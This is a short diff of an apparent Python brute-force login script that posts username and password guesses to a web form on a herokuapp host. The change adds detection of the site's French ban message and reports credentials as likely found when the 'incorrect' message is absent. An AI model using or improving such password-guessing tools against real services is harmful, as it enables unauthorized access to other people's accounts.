@@ -45,9 +45,10 @@ response = requests.post('http://grabme.herokuapp.com/target/', headers=headers,
 
 # Checking Response To Get Correct Password.
 
-if "incorrect username or password" and "Vous avez ete Bannis!" not in response.text:
+if "Vous avez ete Bannis!" in response.text:
+    print(Fore.RED + "You Have Ben Banned By The Website")
+
+elif "incorrect username or password" not in response.text:
     print(Fore.GREEN + "Credentials Are Likely Found: ")
     print(Fore.GREEN + "Username: ", user)
     print(Fore.GREEN + "Password: ", password)
-else:
-    print(Fore.RED + "Failed!")
